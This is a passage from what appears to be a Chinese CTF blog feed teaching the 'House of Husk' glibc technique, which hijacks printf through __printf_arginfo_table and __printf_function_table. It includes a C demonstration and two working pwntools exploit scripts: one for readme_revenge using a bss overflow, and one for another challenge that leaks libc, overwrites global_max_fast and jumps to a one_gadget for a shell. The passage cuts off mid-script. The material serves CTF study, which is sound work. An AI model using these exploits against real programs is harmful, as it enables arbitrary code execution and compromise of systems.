punctuation\">;</span> \n\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>__printf_arginfo_table<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> fake_zone<span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点1</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>__printf_function_table<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点2</span>\n\n    <span class=\"token comment\">// getchar();</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">\"114514\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>",
            "tags": [
                "CTF",
                "PWN"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/House-of-husk%E5%AD%A6%E4%B9%A0/",
            "url": "http://niyah.cn/CTF/House-of-husk%E5%AD%A6%E4%B9%A0/",
            "title": "House-of-husk学习",
            "date_published": "2022-01-25T16:00:00.000Z",
            "content_html": "<p>新姿势</p>\n<a id=\"more\"></a>\n<h1 id=\"house-of-husk学习\"><a class=\"markdownIt-Anchor\" href=\"#house-of-husk学习\">#</a> House-of-husk 学习</h1>\n<h2 id=\"利用原理\"><a class=\"markdownIt-Anchor\" href=\"#利用原理\">#</a> 利用原理</h2>\n<p>参考链接：<a href=\"https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458392560&amp;idx=1&amp;sn=73533c60d701ad5816545520bc889135&amp;chksm=b18f277a86f8ae6ce880fd532b70bbbb70180859299f7476bd1d3033a43ea7e0b3fb6709c460&amp;mpshare=1&amp;scene=23&amp;srcid=0916yGLvaaM3pZ9PY81C5D8W&amp;sharer_sharetime=1631793106745&amp;sharer_shareid=a934676a75a04c6ea85c1e3e4f6123af#rd\">高 Glibc 版本下的堆骚操作解析</a></p>\n<p>利用了 <code>printf</code>  的一个调用链</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\">printf<span class=\"token operator\">-></span>vfprintf<span class=\"token operator\">-></span>printf_positional<span class=\"token operator\">-></span>__parse_one_specmb<span class=\"token operator\">-></span><span class=\"token function\">__printf_arginfo_table</span><span class=\"token punctuation\">(</span>spec<span class=\"token punctuation\">)</span> </code></pre>\n<p>_parse_one_specmb 函数会调用 __printf_arginfo_table 和__printf_function_table 两个函数指针中对应 spec 索引的函数指针 printf_arginfo_size_function</p>\n<blockquote>\n<p>这个 spec 索引指针就是格式化字符的 ascii 码值，比如 printf (&quot;% s&quot;)，那么就是 s 的 ascii 码值。</p>\n</blockquote>\n<p>即调用 (__printf_arginfo_table+'spec’8) 和 (printf_function_table+'spec’8) 这两个函数指针。</p>\n<p>实际情况会先调用__printf_arginfo_table 中对应的 spec 索引的函数指针</p>\n<h2 id=\"利用条件\"><a class=\"markdownIt-Anchor\" href=\"#利用条件\">#</a> 利用条件</h2>\n<p>调用的前提便是__printf_arginfo_table 和__printf_function_table 均不为 0，当然大前提是程序要有 printf 和格式化字符串参数</p>\n<blockquote>\n<ul>\n<li>__printf_function_table != 0</li>\n<li>__printf_arginfo_table = heap_addr</li>\n<li>heap_addr+‘spec’*8 = one_gadget</li>\n</ul>\n<p><strong>其中 heap_addr 可以为任何可控地址</strong></p>\n</blockquote>\n<p>如果我们可以将可控的地址写到 __printf_arginfo_table 和 __printf_function_table 便可以进行利用，如 large bin attack 写入堆地址</p>\n<h2 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题</h2>\n<h3 id=\"readme_revenge\"><a class=\"markdownIt-Anchor\" href=\"#readme_revenge\">#</a> readme_revenge</h3>\n<p>首先是对 name 进行输入，其中 name 存在于 bss 段</p>\n<p><img src=\"/CTF/House-of-husk%E5%AD%A6%E4%B9%A0/image-20220126185959019.png\" alt=\"image-20220126185959019\"></p>\n<p>那么我们可以直接从 bss 段溢出覆盖各种我们需要的条件</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./readme_revenge'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary,'-g','1234'])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    flag_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006B4040</span>\n    name_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006B73E0</span>\n    argv_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006b7980</span>\n\n    __printf_function_table_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006B7A28</span>\n    __printf_arginfo_table_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006B7AA8</span>\n    <span class=\"token comment\"># 由于是静态连接，这两个地址可以自己去 printf 函数中去找</span>\n    \n    stack_chk_fail <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000004359b0</span>\n    \n    payload  <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span>\n    payload  <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x73</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>stack_chk_fail<span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置要执行的函数</span>\n    payload  <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>argv_addr <span class=\"token operator\">-</span> name_addr <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span> name_addr <span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置 argv[0] 即程序名地址为 flag 的地址、</span>\n    payload  <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>__printf_function_table_addr <span class=\"token operator\">-</span> name_addr <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    payload  <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>__printf_arginfo_table_addr <span class=\"token operator\">-</span> name_addr <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span> name_addr <span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置要执行的函数地址 （需要算好偏移）</span>\n\n    <span class=\"token comment\"># 本题输入在bss段，可以将下面的东西全部覆盖到</span>\n    sl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># p.success(getShell())</span>\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   readme_revenge.py\n@Time    :   2022/01/26 18:11:40\n@Author  :   Niyah \n'''</span></code></pre>\n<h3 id=\"送分题\"><a class=\"markdownIt-Anchor\" href=\"#送分题\">#</a> 送分题</h3>\n<p>本题逻辑很清晰，且可以申请两个特别大的块，并且有个 uaf 可以对 unsorted bin 进行修改，我们泄露出 libc 地址后直接攻击 global_max_fast 让特别大的块也属于 fast bin 随后释放两个大块的时候就会把这两个大块的地址写到 main_arena 附近，如果我们控制好堆块大小，可以直接写到 __printf_arginfo_table 和 __printf_function_table</p>\n<p>此时让__printf_arginfo_table 处指向的这个堆块的合适位置为一个函数指针，便可以在 printf 的时候调用这个函数从而 getshell</p>\n<p><img src=\"/CTF/House-of-husk%E5%AD%A6%E4%B9%A0/1.png\" alt=\"1\"></p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./sftpwn'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    __printf_arginfo_table <span class=\"token operator\">=</span> <span class=\"token number\">0x3ec870</span>\n    __printf_function_table <span class=\"token operator\">=</span> <span class=\"token number\">0x3f0658</span>\n    main_arena <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span> \n\n    size1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>__printf_arginfo_table <span class=\"token operator\">-</span> main_arena<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x50</span>\n    size2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>__printf_function_table <span class=\"token operator\">-</span> main_arena<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x50</span>\n    <span class=\"token comment\"># 算好 size ，让其 free 时刚好在 __printf_arginfo_table 和 __printf_function_table</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'size1'</span><span class=\"token punctuation\">,</span>size1<span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'size2'</span><span class=\"token punctuation\">,</span>size2<span class=\"token punctuation\">)</span>\n\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'big box, what size?'</span> <span class=\"token punctuation\">,</span> size1<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'bigger box, what size?'</span> <span class=\"token punctuation\">,</span> size2<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'rename?(y/n)'</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">)</span>\n\n    __malloc_hook <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span>\n    global_max_fast <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> <span class=\"token number\">0x3ed940</span>\n    ogg <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> <span class=\"token number\">0x10a45c</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'global_max_fast'</span><span class=\"token punctuation\">,</span>global_max_fast<span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'ogg'</span><span class=\"token punctuation\">,</span>ogg<span class=\"token punctuation\">)</span>\n\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'name'</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span>global_max_fast <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> global_max_fast <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'(1:big/2:bigger)'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n    